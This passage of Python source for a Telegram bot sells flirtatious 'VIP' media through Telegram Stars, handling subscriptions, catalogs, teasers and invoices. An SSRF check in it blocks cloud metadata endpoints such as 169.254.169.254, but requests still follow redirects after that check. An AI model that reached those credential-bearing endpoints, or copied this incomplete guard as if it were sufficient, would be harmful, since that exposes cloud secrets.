                bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')
                
            except ValueError:
                bot.send_message(message.chat.id, "❌ Invalid duration! Please enter a number of days (e.g., 7, 30, 90):")
                return
        
        elif setting == 'description':
            # Handle VIP description input
            if len(user_input) < 5:
                bot.send_message(message.chat.id, "❌ Description too short! Please enter at least 5 characters:")
                return
            
            # Update VIP description setting
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('INSERT OR REPLACE INTO vip_settings (key, value) VALUES (?, ?)', 
                         ('vip_description', user_input))
            conn.commit()
            conn.close()
            
            # Clear session
            del upload_sessions[OWNERS[0]]
            
            # Escape HTML special characters to prevent malformed HTML rendering
            safe_description = user_input.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            
            success_text = f"""
✅ <b>VIP DESCRIPTION UPDATED SUCCESSFULLY!</b> ✅

📝 <b>New VIP Description:</b> 
"{safe_description}"

🎉 This description will now appear when users see the VIP upgrade option!
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("⚙️ VIP Settings", callback_data="vip_settings"))
            markup.add(types.InlineKeyboardButton("🏠 VIP Dashboard", callback_data="cmd_vip"))
            
            bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')
    
    except Exception as e:
        logger.error(f"Error handling VIP settings input: {e}")
        # Clear session on error
        if OWNERS[0] in upload_sessions:
            del upload_sessions[OWNERS[0]]
        bot.send_message(message.chat.id, "❌ An error occurred while updating the setting. Please try again from VIP Settings.")

def complete_vip_upload_with_defaults(session):
    """Complete VIP upload using default values"""
    # Use suggested name if no custom name provided
    if not session.get('name'):
        session['name'] = session.get('suggested_name', f"vip_content_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}")
    
    # Use default description if none provided
    if not session.get('description'):
        session['description'] = f"Exclusive VIP {session.get('file_type', 'content').lower()}"
    
    # Set VIP price (free for VIP members)
    session['price'] = 0
    
    # Save VIP content
    save_uploaded_content(session)

# VIP Content Management Functions

def get_vip_content_count():
    """Get count of VIP-only content"""
    with app.app_context():
        return ContentItem.query.filter_by(content_type='vip').count()

def get_vip_content_list():
    """Get all VIP-only content with details"""
    with app.app_context():
        content_items = ContentItem.query.filter_by(content_type='vip').order_by(ContentItem.created_date.desc()).all()
        return [(c.name, c.price_stars, c.file_path, c.description, c.created_date) for c in content_items]

def add_vip_content(name, price_stars, file_path, description):
    """Add new VIP-only content"""
    with app.app_context():
        new_content = ContentItem(
            name=name,
            price_stars=price_stars,
            file_path=file_path,
            description=description,
            created_date=datetime.datetime.now(),
            content_type='vip'
        )
        db.session.add(new_content)
        db.session.commit()

def update_vip_content(name, price_stars, file_path, description):
    """Update existing VIP content"""
    with app.app_context():
        content = ContentItem.query.filter_by(name=name, content_type='vip').first()
        if content:
            content.price_stars = price_stars
            content.file_path = file_path
            content.description = description
            db.session.commit()
            return True
        return False

def delete_vip_content(name):
    """Delete VIP content by name"""
    with app.app_context():
        content = ContentItem.query.filter_by(name=name, content_type='vip').first()
        if content:
            db.session.delete(content)
            db.session.commit()
            return True
        return False

def get_vip_content_by_name(name):
    """Get specific VIP content by name"""
    with app.app_context():
        content = ContentItem.query.filter_by(name=name, content_type='vip').first()
        if content:
            return (content.name, content.price_stars, content.file_path, content.description, content.created_date)
        return None

# VIP Management Functions

def check_vip_status(user_id):
    """Check if user has active VIP subscription"""
    with app.app_context():
        subscription = VipSubscription.query.filter_by(
            user_id=user_id, 
            is_active=True
        ).first()
        
        if not subscription:
            return {'is_vip': False, 'days_left': 0, 'expired': False}
        
        # Check if subscription is still valid
        now = datetime.datetime.now()
        
        if subscription.expiry_date > now:
            days_left = (subscription.expiry_date - now).days
            return {'is_vip': True, 'days_left': days_left, 'expired': False}
        else:
            # Subscription expired, deactivate it
            deactivate_expired_vip(user_id)
            return {'is_vip': False, 'days_left': 0, 'expired': True}

def deactivate_expired_vip(user_id):
    """Deactivate expired VIP subscription"""
    with app.app_context():
        subscription = VipSubscription.query.filter_by(user_id=user_id).first()
        if subscription:
            subscription.is_active = False
            db.session.commit()

def get_vip_settings(key):
    """Get VIP setting value"""
    with app.app_context():
        setting = VipSetting.query.filter_by(key=key).first()
        return setting.value if setting else None

def get_vip_settings_original(key):
    """Original get VIP setting value function - deprecated"""
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT value FROM vip_settings WHERE key = ?', (key,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def update_vip_settings(key, value):
    """Update VIP setting"""
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO vip_settings (key, value) VALUES (?, ?)', (key, value))
    conn.commit()
    conn.close()

def activate_vip_subscription(user_id):
    """Activate or renew VIP subscription for user"""
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    
    # Get VIP duration from settings
    duration_days = int(get_vip_settings('vip_duration_days') or 30)
    
    now = datetime.datetime.now()
    
    # Check if user already has an active subscription
    cursor.execute('SELECT expiry_date FROM vip_subscriptions WHERE user_id = ? AND is_active = 1', (user_id,))
    existing = cursor.fetchone()
    
    if existing:
        # Extend existing subscription
        try:
            current_expiry = datetime.datetime.fromisoformat(existing[0])
            # If still active, extend from expiry date, otherwise from now
            extend_from = max(current_expiry, now)
        except:
            extend_from = now
        
        new_expiry = extend_from + datetime.timedelta(days=duration_days)
        
        cursor.execute('''
            UPDATE vip_subscriptions 
            SET expiry_date = ?, is_active = 1, total_payments = total_payments + 1
            WHERE user_id = ?
        ''', (new_expiry.isoformat(), user_id))
    else:
        # Create new subscription
        expiry_date = now + datetime.timedelta(days=duration_days)
        
        cursor.execute('''
            INSERT OR REPLACE INTO vip_subscriptions 
            (user_id, start_date, expiry_date, is_active, total_payments)
            VALUES (?, ?, ?, 1, 1)
        ''', (user_id, now.isoformat(), expiry_date.isoformat()))
    
    conn.commit()
    conn.close()
    
    return duration_days

def deliver_vip_content(chat_id, user_id, content_name):
    """Deliver VIP-only content for free to VIP users"""
    # Verify VIP status
    vip_status = check_vip_status(user_id)
    if not vip_status['is_vip']:
        bot.send_message(chat_id, "❌ VIP membership required! Please upgrade to VIP to access this content for free.")
        return
    
    # Get content details - ONLY access VIP content type
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT file_path, description, content_type FROM content_items WHERE name = ? AND content_type = ?', (content_name, 'vip'))
    content = cursor.fetchone()
    conn.close()
    
    if not content:
        bot.send_message(chat_id, f"❌ VIP content '{content_name}' not found. This content may not be available in the VIP library.")
        return
    
    file_path, description, content_type = content
    
    # Verify this is actually VIP content (double-check)
    if content_type != 'vip':
        bot.send_message(chat_id, f"❌ '{content_name}' is not VIP-exclusive content. This content requires individual purchase.")
        return
    
    # Send VIP access message
    vip_message = f"""
💎 <b>VIP EXCLUSIVE ACCESS</b> 💎

🎉 Here's your free content as a VIP member!

<b>{content_name}</b>
{description}

💕 Thank you for being an amazing VIP supporter!
⏰ Your VIP expires in {vip_status['days_left']} days
"""
    
    bot.send_message(chat_id, vip_message, parse_mode='HTML')
    
    # Send the actual content (same logic as paid content delivery)
    try:
        if file_path.startswith('http'):
            # It's a URL
            if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):
                bot.send_photo(chat_id, file_path, caption=f"💎 VIP: {content_name}")
            elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):
                bot.send_video(chat_id, file_path, caption=f"💎 VIP: {content_name}")
            else:
                bot.send_document(chat_id, file_path, caption=f"💎 VIP: {content_name}")
        elif len(file_path) > 50 and not file_path.startswith('/'):
            # It's a Telegram file_id
            try:
                bot.send_photo(chat_id, file_path, caption=f"💎 VIP: {content_name}")
            except:
                try:
                    bot.send_video(chat_id, file_path, caption=f"💎 VIP: {content_name}")
                except:
                    try:
                        bot.send_document(chat_id, file_path, caption=f"💎 VIP: {content_name}")
                    except:
                        bot.send_message(chat_id, f"💎 Your VIP content: {content_name}\n\nFile ID: {file_path}\n\n⚠️ If you have trouble accessing this content, please contact me!")
        else:
            # It's a local file path
            with open(file_path, 'rb') as file:
                if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):
                    bot.send_photo(chat_id, file, caption=f"💎 VIP: {content_name}")
                elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):
                    bot.send_video(chat_id, file, caption=f"💎 VIP: {content_name}")
                else:
                    bot.send_document(chat_id, file, caption=f"💎 VIP: {content_name}")
    except Exception as e:
        bot.send_message(chat_id, f"💎 Your VIP content: {content_name}\n\n⚠️ There was an issue delivering your content. Please contact me and I'll send it manually!")
        logger.error(f"Error sending VIP content {content_name}: {e}")
    
    # Notify owner of VIP content access
    try:
        user_data = get_user_data(user_id)
        if user_data:
            username = user_data[1] or "none"
            first_name = user_data[2] or "N/A"
            
            bot.send_message(OWNER_ID, f"""
💎 <b>VIP CONTENT ACCESS</b>

👤 VIP Member: {first_name} (@{username})
🎁 Content: {content_name}
🆔 User ID: {user_id}
⏰ VIP expires in {vip_status['days_left']} days
""", parse_mode='HTML')
    except Exception as e:
        logger.error(f"Error notifying owner of VIP access: {e}")

def validate_url_security(url):
    """
    Validate URL to prevent SSRF attacks
    
    Args:
        url (str): URL to validate
        
    Returns:
        tuple: (is_safe, error_message)
    """
    try:
        parsed = urlparse(url)
        
        # Only allow http and https
        if parsed.scheme.lower() not in ('http', 'https'):
            return False, "Only HTTP and HTTPS URLs are allowed"
        
        # Resolve hostname to IP address
        hostname = parsed.hostname
        if not hostname:
            return False, "Invalid hostname"
        
        # Get IP address
        ip_str = socket.gethostbyname(hostname)
        ip = ipaddress.ip_address(ip_str)
        
        # Block private, loopback, link-local, and multicast addresses
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_multicast:
            return False, "Access to internal/private networks is not allowed"
        
        # Block common metadata endpoints
        if hostname.lower() in ['metadata.google.internal', '169.254.169.254', 'metadata']:
            return False, "Access to metadata endpoints is not allowed"
        
        return True, ""
        
    except socket.gaierror:
        return False, "Could not resolve hostname"
    except Exception as e:
        return False, f"URL validation error: {str(e)}"

def download_and_upload_image(url, chat_id=None):
    """
    Download an image from an external URL and upload it to Telegram to get a permanent file_id.
    
    Args:
        url (str): The external image URL to download
        chat_id (int): Optional chat ID for progress notifications
    
    Returns:
        tuple: (success, file_id_or_error_message, file_type)
    """
    try:
        # Validate URL format
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            return False, "❌ Invalid URL format", None
        
        # Security validation to prevent SSRF
        is_safe, security_error = validate_url_security(url)
        if not is_safe:
            return False, f"❌ Security error: {security_error}", None
        
        # Send progress notification if chat_id provided
        if chat_id:
            bot.send_message(chat_id, "⏳ Downloading image from external URL...", parse_mode='HTML')
        
        # Download the image with appropriate headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        # Download with timeout and size limit
        response = requests.get(url, headers=headers, timeout=30, stream=True)
        response.raise_for_status()
        
        # Check content type
        content_type = response.headers.get('content-type', '').lower()
        if not content_type.startswith('image/'):
            return False, "❌ URL does not point to an image file", None
        
        # Check file size (limit to 50MB to stay within Telegram limits)
        content_length = response.headers.get('content-length')
        if content_length and int(content_length) > 50 * 1024 * 1024:
            return False, "❌ Image file too large (max 50MB)", None
        
        # Determine file extension and type
        file_extension = None
        file_type = "photo"  # Default to photo
        
        if 'jpeg' in content_type or 'jpg' in content_type:
            file_extension = '.jpg'
            file_type = "photo"
        elif 'png' in content_type:
            file_extension = '.png'
            file_type = "photo"
        elif 'gif' in content_type:
            file_extension = '.gif'
            file_type = "animation"
        elif 'webp' in content_type:
            file_extension = '.webp'
            file_type = "photo"
        else:
            # Try to get extension from URL
            url_path = parsed_url.path.lower()
            if any(ext in url_path for ext in ['.jpg', '.jpeg']):
                file_extension = '.jpg'
                file_type = "photo"
            elif '.png' in url_path:
                file_extension = '.png'
                file_type = "photo"
            elif '.gif' in url_path:
                file_extension = '.gif'
                file_type = "animation"
            elif '.webp' in url_path:
                file_extension = '.webp'
                file_type = "photo"
            else:
                file_extension = '.jpg'  # Default fallback
                file_type = "photo"
        
        # Update progress
        if chat_id:
            bot.send_message(chat_id, "📤 Uploading to Telegram...", parse_mode='HTML')
        
        # Create temporary file and download content
        with tempfile.NamedTemporaryFile(suffix=file_extension, delete=False) as temp_file:
            # Download in chunks to handle large files
            downloaded_size = 0
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    temp_file.write(chunk)
                    downloaded_size += len(chunk)
                    # Stop if file gets too large
                    if downloaded_size > 50 * 1024 * 1024:
                        temp_file.close()
                        os.unlink(temp_file.name)
                        return False, "❌ Image file too large (max 50MB)", None
            
            temp_file_path = temp_file.name
        
        # Upload to Telegram based on file type
        try:
            with open(temp_file_path, 'rb') as file:
                if file_type == "animation":
                    # Upload as animation (GIF)
                    result = bot.send_animation(OWNER_ID, file)
                    if result and result.animation:
                        file_id = result.animation.file_id
                    else:
                        raise Exception("Failed to get animation file_id from Telegram")
                else:
                    # Upload as photo
                    result = bot.send_photo(OWNER_ID, file)
                    if result and result.photo:
                        file_id = result.photo[-1].file_id  # Get highest resolution
                    else:
                        raise Exception("Failed to get photo file_id from Telegram")
                
                # Delete the temporary file
                os.unlink(temp_file_path)
                
                # Send success notification
                if chat_id:
                    bot.send_message(chat_id, "✅ Image successfully uploaded to Telegram!", parse_mode='HTML')
                
                logger.info(f"Successfully converted URL to file_id: {url} -> {file_id}")
                return True, file_id, file_type
                
        except Exception as upload_error:
            # Clean up temp file on upload error
            if os.path.exists(temp_file_path):
                os.unlink(temp_file_path)
            logger.error(f"Error uploading to Telegram: {upload_error}")
            return False, f"❌ Failed to upload to Telegram: {str(upload_error)}", None
    
    except requests.exceptions.Timeout:
        return False, "❌ Download timed out. Please try again or use a different URL.", None
    except requests.exceptions.ConnectionError:
        return False, "❌ Connection error. Please check the URL and try again.", None
    except requests.exceptions.HTTPError as e:
        if e.response.status_code == 403:
            return False, "❌ Access forbidden. The image may have hotlink protection.", None
        elif e.response.status_code == 404:
            return False, "❌ Image not found (404). Please check the URL.", None
        else:
            return False, f"❌ HTTP error {e.response.status_code}. Please try a different URL.", None
    except requests.exceptions.RequestException as e:
        return False, f"❌ Download failed: {str(e)}", None
    except Exception as e:
        logger.error(f"Unexpected error in download_and_upload_image: {e}")
        return False, f"❌ Unexpected error: {str(e)}", None

# Bot command handlers

@bot.message_handler(commands=['start'])
def start_command(message):
    """Handle /start command"""
    add_or_update_user(message.from_user)
    
    # Check VIP status
    vip_status = check_vip_status(message.from_user.id)
    vip_text = ""
    if vip_status['is_vip']:
        days_left = vip_status['days_left']
        vip_text = f"\n💎 VIP MEMBER (expires in {days_left} days)\n"
    
    welcome_text = f"""
🌟 Welcome to my private paradise only the bold get in here, {message.from_user.first_name}! 🌟
{vip_text}
Get ready to dive into me exclusive, unfiltered, and all yours. 🔥

✨ What you can do here:
• Get FREE teasers and previews
• Purchase exclusive content with Telegram Stars
• Access special fan-only content

💫 Quick actions:
"""
    
    # Create inline keyboard with main menu buttons
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🌟 VIP Portal", callback_data="vip_access"))
    markup.add(types.InlineKeyboardButton("🎬 Free VIP Teasers", callback_data="teasers"))
    markup.add(types.InlineKeyboardButton("🛒 Content Showcase", callback_data="browse_content"))
    markup.add(types.InlineKeyboardButton("ℹ️ Help", callback_data="help"))
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)

@bot.message_handler(commands=['teaser'])
def teaser_command(message):
    """Handle /teaser command with VIP-exclusive content"""
    add_or_update_user(message.from_user)
    
    # Check VIP status
    vip_status = check_vip_status(message.from_user.id)
    is_vip = vip_status['is_vip']
    
    if is_vip:
        # Get VIP teasers first, if none exist show regular message
        vip_teasers = get_vip_teasers()
        
        if vip_teasers:
            # Send VIP teaser (most recent)
            file_path, file_type, description = vip_teasers[0]
            
            # Escape HTML characters in description
            safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            
            teaser_text = f"""
💎 <b>VIP EXCLUSIVE TEASER</b> 💎

🎉 Special preview content just for my VIP members!

{safe_description}

🌟 <b>VIP Perks Active:</b>
• Unlimited free access to all content
• Exclusive VIP-only teasers like this one
• Direct personal communication priority
• Monthly bonus content drops

⏰ Your VIP expires in {vip_status['days_left']} days

💕 You're absolutely amazing for being VIP! This exclusive content is made just for you... ✨
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🎁 Access All VIP Content FREE", callback_data="browse_content"))
            markup.add(types.InlineKeyboardButton("🎬 VIP Teasers Collection", callback_data="vip_teasers_collection"))
            markup.add(types.InlineKeyboardButton("🔄 Extend VIP Membership", callback_data="vip_access"))
            
            bot.send_message(message.chat.id, teaser_text, reply_markup=markup, parse_mode='HTML')
            
            # Send the actual VIP teaser file
            try:
                if file_path.startswith('http'):
                    # It's a URL
                    if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):
                        bot.send_photo(message.chat.id, file_path, caption=f"💎 VIP Exclusive")
                    elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):
                        bot.send_video(message.chat.id, file_path, caption=f"💎 VIP Exclusive")
                    else:
                        bot.send_document(message.chat.id, file_path, caption=f"💎 VIP Exclusive")
                elif len(file_path) > 50 and not file_path.startswith('/'):
                    # It's a Telegram file_id
                    try:
                        bot.send_photo(message.chat.id, file_path, caption=f"💎 VIP Exclusive")
                    except:
                        try:
                            bot.send_video(message.chat.id, file_path, caption=f"💎 VIP Exclusive")
                        except:
                            bot.send_message(message.chat.id, f"💎 Your exclusive VIP teaser is ready, but there was a technical issue. Please contact me directly!")
                else:
                    # It's a local file path
                    with open(file_path, 'rb') as file:
                        if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):
                            bot.send_photo(message.chat.id, file, caption=f"💎 VIP Exclusive")
                        elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):
                            bot.send_video(message.chat.id, file, caption=f"💎 VIP Exclusive")
                        else:
                            bot.send_document(message.chat.id, file, caption=f"💎 VIP Exclusive")
            except Exception as e:
                logger.error(f"Error sending VIP teaser: {e}")
                bot.send_message(message.chat.id, f"💎 Your exclusive VIP teaser is ready, but there was a technical issue. Please contact me directly!")
        else:
            # No VIP teasers available, show default VIP message
            teaser_text = f"""
💎 <b>VIP EXCLUSIVE TEASERS</b> 💎

🎉 Special VIP preview just for you!

<i>[VIP members get access to premium teasers, behind-the-scenes content, and exclusive previews not available to regular users]</i>

🌟 <b>VIP Perks Active:</b>
• Unlimited free access to all content
• Exclusive VIP-only content
• Direct personal communication priority
• Monthly bonus content drops

⏰ Your VIP expires in {vip_status['days_left']} days

💕 You're absolutely amazing for being VIP! Here's what's new this week...

✨ <i>"The best content is exclusively yours!"</i> ✨
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🎁 Access All VIP Content FREE", callback_data="browse_content"))
            markup.add(types.InlineKeyboardButton("🔄 Extend VIP Membership", callback_data="vip_access"))
        
    else:
        # Get teasers from database
        teasers = get_teasers()
        
        if teasers:
            # Send first teaser (most recent)
            file_path, file_type, description = teasers[0]
            
            # Escape HTML characters in description to prevent parsing errors
            safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            
            teaser_text = f"""
🎬 <b>FREE TEASER CONTENT</b> 🎬

Here's a little preview of what's waiting for you in my exclusive collection...

{safe_description}

💝 This is just a taste of what I have for my special fans. Want to see more? Check out my full content library!

💡 <b>VIP members get:</b>
• FREE access to ALL content
• Exclusive VIP-only teasers (like this one, but better!)
• Direct personal chat priority
• Monthly bonus content

<i>"Babe, you haven't seen anything yet. The best is just getting started...."</i> ✨
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("💎 Elevate to VIP for FREE Access", callback_data="vip_access"))
            markup.add(types.InlineKeyboardButton("🛒 Browse Content to Purchase", callback_data="browse_content"))
            
            bot.send_message(message.chat.id, teaser_text, reply_markup=markup, parse_mode='HTML')
            
            # Send the actual teaser media
            try:
                if file_path.startswith('http'):
                    # It's a URL
                    if file_type == 'photo':
                        bot.send_photo(message.chat.id, file_path, caption="🎬 Free Teaser Preview")
                    elif file_type == 'video':
                        bot.send_video(message.chat.id, file_path, caption="🎬 Free Teaser Preview")
                elif len(file_path) > 50 and not file_path.startswith('/'):
                    # It's a Telegram file_id
                    if file_type == 'photo':
                        bot.send_photo(message.chat.id, file_path, caption="🎬 Free Teaser Preview")
                    elif file_type == 'video':
                        bot.send_video(message.chat.id, file_path, caption="🎬 Free Teaser Preview")
                else:
                    # It's a local file path
                    with open(file_path, 'rb') as file:
                        if file_type == 'photo':
                            bot.send_photo(message.chat.id, file, caption="🎬 Free Teaser Preview")
                        elif file_type == 'video':
                            bot.send_video(message.chat.id, file, caption="🎬 Free Teaser Preview")
            except Exception as e:
                logger.error(f"Error sending teaser media: {e}")
                bot.send_message(message.chat.id, "🎬 Teaser content is being prepared...")
            
            return
        
        # No teasers available - show "COMING SOON"
        teaser_text = """
🎬 <b>FREE TEASER</b> 🎬

Here's a little preview of what's waiting for you in my exclusive collection...

<b>COMING SOON</b>

💝 That was just a sneak peek, darling. Want the real deal? Check out my full content library!

💡 <b>VIP members get:</b>
• FREE access to ALL content
• Exclusive VIP-only teasers (like this one, but better!)
• Direct personal chat priority
• Monthly bonus content

✨ <i>"The best is yet to come..."</i> ✨
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("💎 Upgrade to VIP for FREE Access", callback_data="vip_access"))
        markup.add(types.InlineKeyboardButton("🛒 Browse Content to Purchase", callback_data="browse_content"))
    
    bot.send_message(message.chat.id, teaser_text, reply_markup=markup, parse_mode='HTML')

@bot.message_handler(commands=['buy'])
def buy_command(message):
    """Handle /buy command"""
    add_or_update_user(message.from_user)
    
    # Parse command for specific item
    command_parts = message.text.split(' ', 1)
    if len(command_parts) > 1:
        item_name = command_parts[1].strip()
        # Try to find and purchase specific item
        purchase_item(message.chat.id, message.from_user.id, item_name)
    else:
        # Show available content for purchase
        show_content_catalog(message.chat.id)

def purchase_item(chat_id, user_id, item_name):
    """Process purchase for specific item - ONLY allows purchases of 'browse' content"""
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    # Only allow purchases of 'browse' content - VIP content is subscription-only
    cursor.execute('SELECT name, price_stars, file_path, description, created_date, content_type FROM content_items WHERE name = ? AND content_type = ?', (item_name, 'browse'))
    item = cursor.fetchone()
    conn.close()
    
    if item:
        name, price_stars, file_path, description, created_date, content_type = item
        
        # Verify this is browse content (double-check)
        if content_type != 'browse':
            bot.send_message(chat_id, f"❌ '{item_name}' is VIP-exclusive content and cannot be purchased individually. Please upgrade to VIP to access this content.")
            return
        
        # Check if user already owns this content
        if check_user_owns_content(user_id, name):
            bot.send_message(chat_id, f"✅ You already own '{name}'! Use 'My Content' to access it again.")
            return
        
        # Create invoice for Telegram Stars
        prices = [types.LabeledPrice(label=name, amount=price_stars)]
        
        bot.send_invoice(
            chat_id=chat_id,
            title=f"Browse Content: {name}",
            description=description,
            invoice_payload=f"content_{name}_{user_id}",
            provider_token=None,  # None for Telegram Stars
            currency='XTR',  # Telegram Stars currency
            prices=prices,
            start_parameter='purchase'
        )
    else:
        # Check if it's VIP content that user is trying to purchase
        conn = sqlite3.connect('content_bot.db')
        cursor = conn.cursor()
        cursor.execute('SELECT name, content_type FROM content_items WHERE name = ?', (item_name,))
        vip_check = cursor.fetchone()
        conn.close()
        
        if vip_check and vip_check[1] == 'vip':
            bot.send_message(chat_id, f"❌ '{item_name}' is VIP-exclusive content and cannot be purchased individually.\n\n💎 Upgrade to VIP subscription for unlimited access to all VIP content!")
        else:
            bot.send_message(chat_id, f"❌ Content '{item_name}' not found in browse catalog. Check /help for available content.")

def show_vip_access(chat_id, user_id):
    """Show VIP access options and current status"""
    vip_status = check_vip_status(user_id)
    vip_price = int(get_vip_settings('vip_price_stars') or 399)
    vip_description = get_vip_settings('vip_description') or 'Premium VIP access with exclusive content and direct chat'
    
    if vip_status['is_vip']:
        # User is already VIP
        status_text = f"""
💎 <b>VIP MEMBER STATUS</b> 💎

🎉 You are currently a VIP member!
⏰ <b>Expires in:</b> {vip_status['days_left']} days

🌟 <b>Your VIP Benefits:</b>
• Unlimited exclusive content access
• Direct personal chat with me
• Priority responses to messages
• Special VIP-only teasers and previews
• Monthly exclusive photo sets
• Behind-the-scenes content

💫 Want to extend your VIP membership?
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(f"🔄 Extend VIP ({vip_price:,} Stars)", callback_data="buy_vip"))
        markup.add(types.InlineKeyboardButton("🎬 VIP Teasers Collection", callback_data="vip_teasers_collection"))
        markup.add(types.InlineKeyboardButton("🛒 Browse Content", callback_data="browse_content"))
        markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
        
    else:
        # User is not VIP
        status_text = f"""
🌟 <b>BECOME A VIP MEMBER</b> 🌟

💰 <b>Price:</b> {vip_price} Telegram Stars/month
📅 <b>Duration:</b> 30 days

💎 <b>VIP Benefits Include:</b>
• Unlimited access to all exclusive content
• Direct personal chat with me
• Priority responses to all your messages
• Special VIP-only teasers and previews
• Monthly exclusive photo sets
• Behind-the-scenes content and stories
• Early access to new content

✨ <b>"{vip_description}"</b>

🚀 Ready to become VIP and get unlimited access?
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(f"💎 Subscribe VIP ({vip_price:,} Stars)", callback_data="buy_vip"))
        markup.add(types.InlineKeyboardButton("🎬 View Free VIP Teasers", callback_data="teasers"))
        markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
    
    bot.send_message(chat_id, status_text, reply_markup=markup, parse_mode='HTML')

def purchase_vip_subscription(chat_id, user_id):
    """Process VIP subscription purchase"""
    vip_price = int(get_vip_settings('vip_price_stars') or 399)
    vip_description = get_vip_settings('vip_description') or 'Premium VIP access'
    
    # Create invoice for VIP subscription
    prices = [types.LabeledPrice(label="VIP Subscription", amount=vip_price)]
    
    bot.send_invoice(
        chat_id=chat_id,
        title="🌟 VIP Membership Subscription",
        description=f"{vip_description} - 30 days unlimited access",
        invoice_payload=f"vip_subscription_{user_id}",
        provider_token=None,  # None for Telegram Stars
        currency='XTR',  # Telegram Stars currency
        prices=prices,
        start_parameter='vip_purchase'
    )

def show_content_catalog(chat_id, user_id=None):
    """Show available BROWSE content for purchase - does not include VIP-only content"""
    # Get user ID if not provided (for callback compatibility)
    if user_id is None:
        # This is a fallback for when called from callback without user_id
        # In practice, we should always pass user_id
        user_id = chat_id  # Assuming direct message context
    
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    # Only show content marked as 'browse' type - not VIP-only content
    cursor.execute('SELECT name, price_stars, description FROM content_items WHERE content_type = ?', ('browse',))
    items = cursor.fetchall()
    conn.close()
    
    if items:
        catalog_text = "<b>BROWSING CONTENT</b> 🛒\n\n"
        catalog_text += "💰 Purchase Specific items with Telegram Stars\n"
        catalog_text += "💡 <b>Tip:</b> VIP members get access to exclusive VIP content library!\n\n"
        
        markup = types.InlineKeyboardMarkup()
        
        # Add VIP buttons at the top first, followed by My Content
        markup.add(types.InlineKeyboardButton("💎 Upgrade to VIP", callback_data="vip_access"))
        markup.add(types.InlineKeyboardButton("💎 Access VIP Content Library", callback_data="vip_content_catalog"))
        markup.add(types.InlineKeyboardButton("📁 My Content", callback_data="my_content"))
        
        for name, price, description in items:
            # Escape HTML special characters to prevent parsing errors
            safe_name = name.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            
            catalog_text += f"✨ <b>{safe_name}</b>\n"
            
            # Check if user already owns this content
            owns_content = check_user_owns_content(user_id, name)
            
            if owns_content:
                catalog_text += f"✅ <b>OWNED</b> - You already purchased this!\n"
                markup.add(types.InlineKeyboardButton(f"🎁 Access {name} (Owned)", callback_data=f"access_{name}"))
            else:
                catalog_text += f"💰 {price:,} Stars\n"
                markup.add(types.InlineKeyboardButton(f"⭐ Buy {name} ({price:,} Stars)", callback_data=f"buy_{name}"))
            
            catalog_text += f"📝 {safe_description}\n\n"
        
        # VIP buttons already added at the top
        
        # Add back button
        markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
        
        bot.send_message(chat_id, catalog_text, reply_markup=markup, parse_mode='HTML')
    else:
        bot.send_message(chat_id, "No browse content available right now. Check back soon! 💕\n\n💎 VIP members have access to exclusive VIP content library!")

def show_vip_catalog(chat_id, user_id=None):
    """Show VIP-only content catalog - requires active VIP subscription"""
    # Get user ID if not provided (for callback compatibility)
    if user_id is None:
        user_id = chat_id  # Assuming direct message context
    
    # Check VIP status - must be VIP to access this catalog
    vip_status = check_vip_status(user_id)
    if not vip_status['is_vip']:
        # Not VIP - show upgrade prompt
        no_vip_message = """
💎 <b>VIP CONTENT</b> 💎

🚫 <b>VIP Membership Required!</b>

This exclusive content is only available to VIP members. Upgrade now to unlock:

